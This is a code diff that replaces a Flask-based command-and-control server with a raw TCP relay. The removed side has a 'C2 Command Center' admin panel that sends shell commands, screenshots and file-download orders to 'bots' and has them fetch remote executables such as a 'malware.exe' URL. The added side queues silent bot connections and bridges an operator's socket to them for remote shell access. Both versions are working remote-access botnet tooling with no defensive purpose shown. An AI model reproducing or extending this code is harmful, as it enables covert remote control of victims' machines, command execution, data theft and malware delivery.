@@ -1,286 +1,189 @@
-from flask import Flask, request, jsonify, send_file, render_template_string, Response
-import time
-import os
+import socket
+import threading
+import struct
 import json
-import base64
-from datetime import datetime
-from io import BytesIO
+import time
 
-app = Flask(__name__)
+# Store connected clients: {id: {'socket': sock, 'addr': addr}}
+clients = {}
+clients_lock = threading.Lock()
+next_client_id = 1
 
-# --- GLOBAL STATE (In-Memory) ---
-# Clients: { client_id: { "ip": str, "last_seen": float, "hostname": str } }
-CLIENTS = {}
-# Command Queue: { client_id: [ { "type": str, "args": str, "id": str } ] }
-COMMANDS = {}
-# Results: { client_id: [ { "type": str, "content": str, "timestamp": str } ] }
-RESULTS = {}
+def send_all(sock, data):
+    try:
+        total = 0
+        length = len(data)
+        while total < length:
+            sent = sock.send(data[total:])
+            if sent == 0: return False
+            total += sent
+        return True
+    except:
+        return False
 
-UPLOAD_FOLDER = 'server_uploads'
-if not os.path.exists(UPLOAD_FOLDER):
-    os.makedirs(UPLOAD_FOLDER)
+def recv_all(sock, length):
+    try:
+        data = b''
+        while len(data) < length:
+            chunk = sock.recv(length - len(data))
+            if not chunk: return None
+            data += chunk
+        return data
+    except:
+        return None
 
-# --- ADMIN UI TEMPLATE ---
-ADMIN_HTML = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>C2 Admin Panel</title>
-    <style>
-        body { font-family: monospace; background: #1a1a1a; color: #0f0; margin: 0; padding: 20px; }
-        .container { max_width: 1200px; margin: 0 auto; }
-        .panel { border: 1px solid #333; padding: 10px; margin-bottom: 20px; background: #222; }
-        h2 { border-bottom: 1px solid #444; padding-bottom: 5px; margin-top: 0; }
-        table { width: 100%; border-collapse: collapse; }
-        th, td { text-align: left; padding: 8px; border-bottom: 1px solid #333; }
-        th { background: #333; }
-        tr:hover { background: #2a2a2a; }
-        input, select, button { background: #333; color: white; border: 1px solid #555; padding: 5px; }
-        button:hover { background: #444; cursor: pointer; }
-        .status-online { color: #0f0; }
-        .status-offline { color: #f00; }
-        #log-window { height: 300px; overflow-y: scroll; border: 1px solid #444; padding: 10px; background: #000; white-space: pre-wrap; }
-        .img-preview { max_width: 100%; border: 1px solid #555; margin-top: 10px; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>[ C2 COMMAND CENTER ]</h1>
-        
-        <div class="panel">
-            <h2>Connected Bots</h2>
-            <button onclick="refreshBots()">Refresh List</button>
-            <table id="bots-table">
-                <thead><tr><th>ID</th><th>IP</th><th>Hostname</th><th>Last Seen</th><th>Actions</th></tr></thead>
-                <tbody></tbody>
-            </table>
-        </div>
-
-        <div class="panel">
-            <h2>Control Panel</h2>
-            <div>
-                <label>Target Bot ID:</label>
-                <input type="text" id="target-id" placeholder="Select a bot above" readonly>
-            </div>
-            <br>
-            <div style="display: flex; gap: 10px;">
-                <input type="text" id="cmd-input" placeholder="Command (e.g., dir, whoami)" style="flex-grow: 1;">
-                <button onclick="sendCommand('shell')">Shell Exec</button>
-                <button onclick="sendCommand('screenshot')">Screenshot</button>
-                <button onclick="sendCommand('download')">Download File</button>
-                <button onclick="uploadFile()">Upload File to Bot</button>
-            </div>
-        </div>
-
-        <div class="panel">
-            <h2>Live Feed / Logs</h2>
-            <div id="log-window"></div>
-        </div>
-    </div>
-
-    <script>
-        let currentBot = null;
-        const API_BASE = "";
-
-        function selectBot(id) {
-            currentBot = id;
-            document.getElementById('target-id').value = id;
-            log(`Selected Bot: ${id}`);
-            fetchResults(id);
-        }
-
-        async function refreshBots() {
-            const res = await fetch(API_BASE + '/api/clients');
-            const data = await res.json();
-            const tbody = document.querySelector('#bots-table tbody');
-            tbody.innerHTML = '';
-            
-            for (const [id, info] of Object.entries(data)) {
-                const now = Date.now() / 1000;
-                const lastSeen = info.last_seen;
-                const isOnline = (now - lastSeen) < 10; // 10s threshold
-                
-                const row = `
-                    <tr onclick="selectBot('${id}')" style="cursor:pointer">
-                        <td>${id}</td>
-                        <td>${info.ip}</td>
-                        <td>${info.hostname}</td>
-                        <td class="${isOnline ? 'status-online' : 'status-offline'}">
-                            ${isOnline ? 'ONLINE' : 'OFFLINE'} (${Math.floor(now - lastSeen)}s ago)
-                        </td>
-                        <td><button onclick="selectBot('${id}')">Select</button></td>
-                    </tr>
-                `;
-                tbody.innerHTML += row;
-            }
-        }
-
-        async function sendCommand(type) {
-            if (!currentBot) { alert("Select a bot first!"); return; }
-            let args = "";
-            
-            if (type === 'shell' || type === 'download') {
-                args = document.getElementById('cmd-input').value;
-                if (!args) { alert("Enter an argument/command!"); return; }
-            }
-
-            const res = await fetch(API_BASE + '/api/command', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ id: currentBot, type: type, args: args })
-            });
-            const j = await res.json();
-            log(`Command Sent: ${type} ${args} -> ${j.status}`);
-            
-            // Start polling for results
-            setTimeout(() => fetchResults(currentBot), 2000);
-        }
-
-        async function uploadFile() {
-             if (!currentBot) { alert("Select a bot first!"); return; }
-             const url = prompt("Enter Direct Download URL for the bot to fetch (e.g. http://site.com/malware.exe):");
-             if (url) {
-                 document.getElementById('cmd-input').value = url;
-                 sendCommand('upload_url');
-             }
-        }
-        
-        async function fetchResults(botId) {
-            if (botId !== currentBot) return;
-            const res = await fetch(API_BASE + `/api/results/${botId}`);
-            const data = await res.json();
-            
-            const logWin = document.getElementById('log-window');
-            logWin.innerHTML = ""; // Clear for now, can append if preferred
-            
-            data.forEach(item => {
-                let content = item.content;
-                if (item.type === 'screenshot') {
-                     content = `<img src="data:image/jpeg;base64,${content}" class="img-preview">`;
-                } else if (item.type === 'file_download') {
-                     content = `[FILE DOWNLOADED] Saved to server as: ${item.filename}`;
-                }
-                
-                logWin.innerHTML += `<div><strong>[${item.timestamp}] ${item.type}:</strong><br>${content}</div><hr>`;
-            });
-        }
-
-        function log(msg) {
-            const logWin = document.getElementById('log-window');
-            logWin.innerHTML += `<div>[SYSTEM] ${msg}</div>`;
-            logWin.scrollTop = logWin.scrollHeight;
-        }
-
-        setInterval(refreshBots, 5000);
-        refreshBots();
-    </script>
-</body>
-</html>
-"""
-
-# --- BOT ENDPOINTS ---
-
-@app.route('/')
-def index():
-    return "Service Running"
-
-@app.route('/register', methods=['POST'])
-def register():
-    """Bot check-in/registration"""
-    data = request.json
-    client_id = data.get('id')
-    hostname = data.get('hostname')
-    
-    CLIENTS[client_id] = {
-        "ip": request.remote_addr,
-        "hostname": hostname,
-        "last_seen": time.time()
-    }
-    
-    if client_id not in COMMANDS:
-        COMMANDS[client_id] = []
-        
-    print(f"[+] Bot Check-in: {client_id} ({request.remote_addr})")
-    return jsonify({"status": "ok"})
-
-@app.route('/poll/<client_id>', methods=['GET'])
-def poll(client_id):
-    """Bot long-polling for commands"""
-    if client_id in CLIENTS:
-        CLIENTS[client_id]['last_seen'] = time.time()
-    
-    # Check for pending commands
-    if client_id in COMMANDS and len(COMMANDS[client_id]) > 0:
-        cmd = COMMANDS[client_id].pop(0)
-        return jsonify(cmd)
-    
-    return jsonify({"status": "idle"})
-
-@app.route('/report/<client_id>', methods=['POST'])
-def report(client_id):
-    """Bot reporting results"""
-    data = request.json
-    if client_id not in RESULTS:
-        RESULTS[client_id] = []
-        
-    result_entry = {
-        "type": data.get('type'),
-        "content": data.get('content'),
-        "filename": data.get('filename'),
-        "timestamp": datetime.now().strftime("%H:%M:%S")
-    }
-    
-    # If it's a file download, save it to disk
-    if data.get('type') == 'file_download' and data.get('content'):
+def bridge_connection(admin_sock, client_sock):
+    """Bridges traffic between admin and client until one disconnects"""
+    def forward(source, dest, name):
         try:
-            file_data = base64.b64decode(data.get('content'))
-            fname = f"{client_id}_{data.get('filename')}"
-            path = os.path.join(UPLOAD_FOLDER, fname)
-            with open(path, 'wb') as f:
-                f.write(file_data)
-            result_entry['content'] = f"Saved to {fname}" 
-            print(f"[+] File received from {client_id}: {fname}")
-        except Exception as e:
-            result_entry['content'] = f"Error saving file: {e}"
+            while True:
+                data = source.recv(4096)
+                if not data: break
+                dest.sendall(data)
+        except:
+            pass
+        # If loop breaks, connection is dead.
+        # We don't explicitly close here, we let the outer scope handle cleanup or let natural TCP FIN propagate.
+        # Actually, if one side closes, we should close the other to signal end.
+        try: dest.close() 
+        except: pass
+        try: source.close()
+        except: pass
 
-    RESULTS[client_id].insert(0, result_entry) # Prepend newest
-    RESULTS[client_id] = RESULTS[client_id][:20] # Keep last 20
+    print("Starting bridge...")
+    t1 = threading.Thread(target=forward, args=(admin_sock, client_sock, "A->C"), daemon=True)
+    t2 = threading.Thread(target=forward, args=(client_sock, admin_sock, "C->A"), daemon=True)
+    t1.start()
+    t2.start()
     
-    print(f"[*] Result received from {client_id}: {data.get('type')}")
-    return jsonify({"status": "received"})
+    t1.join()
+    t2.join()
+    print("Bridge ended.")
 
-# --- ADMIN ENDPOINTS ---
+def handle_admin(sock):
+    """Handle Admin Connection"""
+    try:
+        while True:
+            # Check for commands.
+            # Admin sends raw bytes, but let's say commands are short strings?
+            # Or we peek?
+            # In our Admin code:
+            # LIST -> send_all(sock, b"LIST")
+            # CONN -> send_all(sock, f"CONN {id}".encode())
+            
+            # Simple text protocol for control
+            data = sock.recv(1024)
+            if not data: break
+            
+            cmd_str = data.decode('utf-8').strip()
+            
+            if cmd_str == "LIST":
+                with clients_lock:
+                    client_list = [{'id': k, 'ip': v['addr'][0]} for k, v in clients.items()]
+                
+                json_bytes = json.dumps(client_list).encode('utf-8')
+                send_all(sock, struct.pack('i', len(json_bytes)))
+                send_all(sock, json_bytes)
+                break # Close after list (Admin design choice)
+                
+            elif cmd_str.startswith("CONN "):
+                try:
+                    headers = cmd_str.split()
+                    target_id = int(headers[1])
+                    
+                    target_sock = None
+                    with clients_lock:
+                        if target_id in clients:
+                            # Pop client to give exclusive access to this Admin?
+                            # Yes, because socket can only bridge to one.
+                            client_obj = clients.pop(target_id)
+                            target_sock = client_obj['socket']
+                    
+                    if target_sock:
+                        send_all(sock, b"OK")
+                        # Enter Bridge Mode
+                        bridge_connection(sock, target_sock)
+                        # When bridge returns, connections are closed.
+                        return
+                    else:
+                        send_all(sock, b"NO")
+                        break
+                except Exception as e:
+                    print(f"Conn error: {e}")
+                    break
+            else:
+                break
+    except Exception as e:
+        print(f"Admin Error: {e}")
+    finally:
+        sock.close()
 
-@app.route('/admin')
-def admin_ui():
-    return render_template_string(ADMIN_HTML)
-
-@app.route('/api/clients')
-def api_clients():
-    return jsonify(CLIENTS)
-
-@app.route('/api/command', methods=['POST'])
-def api_command():
-    data = request.json
-    client_id = data.get('id')
-    cmd_type = data.get('type')
-    args = data.get('args', '')
+def handle_unknown(sock, addr):
+    """Determine if Admin or Client"""
+    global next_client_id
     
-    if client_id not in COMMANDS:
-        COMMANDS[client_id] = []
+    # We give the connector 2 seconds to say "ADMIN"
+    # The current bot is silent upon connection.
+    try:
+        sock.settimeout(2.0)
+        first_bytes = sock.recv(5)
+        sock.settimeout(None)
         
-    COMMANDS[client_id].append({
-        "type": cmd_type,
-        "args": args,
-        "id": str(time.time())
-    })
+        if first_bytes == b"ADMIN":
+            print(f"Admin connected from {addr}")
+            handle_admin(sock)
+        else:
+            # It's a Bot (or it sent garbage, we assume Bot)
+            # If it sent something that wasn't ADMIN, we might have eaten part of its protocol?
+            # But Bot protocol is passive (waits for server). So Bot sends NOTHING.
+            # If recv times out => Bot.
+            # If recv returns data != ADMIN => Unknown, but treat as Bot?
+            # Actually, if Bot is silent, recv throws Timeout.
+            pass
+            
+            # This path is unreachable if Timeout occurred.
+            # We catch timeout below.
+            
+    except socket.timeout:
+        # Timeout means silent connection => Bot
+        sock.settimeout(None)
+        with clients_lock:
+            cid = next_client_id
+            next_client_id += 1
+            clients[cid] = {'socket': sock, 'addr': addr}
+        
+        print(f"[+] Client {cid} connected from {addr}")
+        
+        # We store it and do nothing. The socket waits in memory.
+        # We need a way to detect if it dies while waiting.
+        # Peek?
+        # For now, we trust TCP keepalives or future errors.
+        return
+
+    except Exception as e:
+        print(f"Handshake error: {e}")
+        sock.close()
+
+def accept_thread(server_socket):
+    while True:
+        try:
+            client_sock, addr = server_socket.accept()
+            threading.Thread(target=handle_unknown, args=(client_sock, addr), daemon=True).start()
+        except Exception as e:
+            print(f"Accept error: {e}")
+
+def main():
+    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     
-    return jsonify({"status": "queued"})
+    try:
+        server_sock.bind(('0.0.0.0', 5000))
+        server_sock.listen(5)
+        print("Relay Server Listening on Port 5000...")
+        
+        accept_thread(server_sock)
+    except Exception as e:
+        print(f"Startup failed: {e}")
 
-@app.route('/api/results/<client_id>')
-def api_results(client_id):
-    return jsonify(RESULTS.get(client_id, []))
-
-if __name__ == '__main__':
-    # Run on all interfaces
-    app.run(host='0.0.0.0', port=5000)
+if __name__ == "__main__":
+    main()
